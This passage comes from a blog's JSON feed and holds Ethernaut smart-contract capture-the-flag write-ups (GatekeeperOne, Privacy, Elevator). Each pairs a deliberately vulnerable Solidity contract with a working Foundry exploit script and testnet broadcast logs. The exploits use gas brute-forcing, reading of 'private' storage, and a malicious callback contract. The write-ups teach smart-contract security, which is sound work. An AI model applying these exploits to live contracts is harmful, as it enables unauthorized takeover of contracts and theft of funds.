class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/units-and-global-variables.html\">Solidity 0.8.30 Documentation - units and global variables</a></p><blockquote>  <p>💡 <code class=\"language-plaintext highlighter-rouge\">gasleft() returns (uint256)</code>: remaining gas</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls\">Solidity 0.8.30 Documentation - external function calls</a></p><blockquote>  <p>💡 When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options <code class=\"language-plaintext highlighter-rouge\">{value: 10, gas: 10000}</code>. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperOne.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">GatekeeperOne</span> <span class=\"n\">gko_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint</span><span class=\"p\">){</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)))</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xFFFFFFFF0000FFFF</span><span class=\"p\">;</span>        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kt\">uint</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"mi\">350</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">gas</span><span class=\"o\">:</span> <span class=\"n\">i</span><span class=\"o\">+</span><span class=\"p\">(</span><span class=\"mi\">8191</span><span class=\"o\">*</span><span class=\"mi\">3</span><span class=\"p\">)}(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"enter(bytes8)\"</span><span class=\"p\">,</span> <span class=\"n\">gateKey</span><span class=\"p\">));</span>            <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"p\">;</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperOneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperOne</span> <span class=\"k\">public</span> <span class=\"n\">gko_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperOne</span><span class=\"p\">(</span><span class=\"mh\">0x8905857EFf6E619C391C6a828B62F86f2D15CCf8</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"gas: \"</span><span class=\"p\">,</span> <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperOneSol.sol <span class=\"nt\">--tc</span> GateKeeperOneSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used <span class=\"k\">for </span>script: 987058Estimated amount required: 0.000001003572467398 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH <span class=\"o\">(</span>427697 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH <span class=\"o\">(</span>278117 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-22-GateKeeper-One/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-22T00:00:00+09:00",
            "date_modified": "2025-04-22T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/privacy",
            "title": "[Ethernaut] 12.Privacy",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock this contract// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy {    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) {        data = _data;    }    function unlock(bytes16 _key) public {        require(_key == bytes16(data[2]));        locked = false;    }    /*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */}Exploit$ cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e// SPDX-License-Ideifier: MITpragma solidity ^0.8.0;import \"../src/Privacy.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract PrivacySol is Script {    Privacy public privacy_ = Privacy(0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        bytes32 key = 0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e;        console.log(\"Befor locked: \", privacy_.locked());        privacy_.unlock(bytes16(key));        console.log(\"After locked: \", privacy_.locked());        vm.stopBroadcast();    }}$ forge script script/PrivacySol.sol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Befor locked:  true  After locked:  false## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used for script: 35136Estimated amount required: 0.000000125458850304 ETH==========================##### holesky✅  [Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH (24025 gas * 0.003570656 gwei)✅ Sequence #1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock this contract</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Privacy</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">ID</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">flattening</span> <span class=\"o\">=</span> <span class=\"mi\">10</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">denomination</span> <span class=\"o\">=</span> <span class=\"mi\">255</span><span class=\"p\">;</span>    <span class=\"kt\">uint16</span> <span class=\"k\">private</span> <span class=\"n\">awkwardness</span> <span class=\"o\">=</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">);</span>    <span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">private</span> <span class=\"n\">data</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">memory</span> <span class=\"n\">_data</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">_data</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span> <span class=\"n\">_key</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">_key</span> <span class=\"o\">==</span> <span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]));</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</code></pre></div></div><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Ideifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Privacy.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">PrivacySol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Privacy</span> <span class=\"k\">public</span> <span class=\"n\">privacy_</span> <span class=\"o\">=</span> <span class=\"n\">Privacy</span><span class=\"p\">(</span><span class=\"mh\">0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">bytes32</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"mh\">0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</span><span class=\"p\">;</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/PrivacySol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Befor locked:  <span class=\"nb\">true  </span>After locked:  <span class=\"nb\">false</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used <span class=\"k\">for </span>script: 35136Estimated amount required: 0.000000125458850304 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH <span class=\"o\">(</span>24025 gas <span class=\"k\">*</span> 0.003570656 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Privacy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/privacy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/elevator",
            "title": "[Ethernaut] 11.Elevator",
            "summary": null,
            "content_text": "AnalysisThe goal is  reach the top of  building.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building {    function isLastFloor(uint256) external returns (bool);}contract Elevator {    bool public top;    uint256 public floor;    function goTo(uint256 _floor) public {        Building building = Building(msg.sender);        if (!building.isLastFloor(_floor)) {            floor = _floor;            top = building.isLastFloor(floor);        }    }}In goTo()  function, Building contract address set msg.sender .If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Elevator.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    bool public top = true;    function ex(Elevator elevator_) public {        elevator_.goTo(1);    }    function isLastFloor(uint256 _floor) public returns (bool) {        top = !top;        return top;    }}contract ElevatorSol is Script {    Elevator public elevator_ = Elevator(0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before floor: \", elevator_.floor());        console.log(\"Before top: \", elevator_.top());        Ex ex = new Ex();        ex.ex(elevator_);        console.log(\"After floor: \", elevator_.floor());        console.log(\"After top: \", elevator_.top());        vm.stopBroadcast();    }}$ forge script script/ElevatorSol.sol --tc ElevatorSol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before floor:  0  Before top:  false  After floor:  1  After top:  true## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used for script: 426394Estimated amount required: 0.000005329926705576 ETH==========================##### holesky✅  [Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH (248779 gas * 0.012499996 gwei)##### holesky✅  [Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH (74558 gas * 0.012499996 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>reach the top of  building.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">Building</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Elevator</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">floor</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">Building</span> <span class=\"n\">building</span> <span class=\"o\">=</span> <span class=\"n\">Building</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">_floor</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">floor</span> <span class=\"o\">=</span> <span class=\"n\">_floor</span><span class=\"p\">;</span>            <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">floor</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In <code class=\"language-plaintext highlighter-rouge\">goTo()</code>  function, Building contract address set <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> .</p><p>If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Elevator.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">Elevator</span> <span class=\"n\">elevator_</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"o\">!</span><span class=\"n\">top</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ElevatorSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Elevator</span> <span class=\"k\">public</span> <span class=\"n\">elevator_</span> <span class=\"o\">=</span> <span class=\"n\">Elevator</span><span class=\"p\">(</span><span class=\"mh\">0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">elevator_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ElevatorSol.sol <span class=\"nt\">--tc</span> ElevatorSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before floor:  0  Before top:  <span class=\"nb\">false  </span>After floor:  1  After top:  <span class=\"nb\">true</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used <span class=\"k\">for </span>script: 426394Estimated amount required: 0.000005329926705576 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH <span class=\"o\">(</span>248779 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH <span class=\"o\">(</span>74558 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Elevator/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/elevator",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
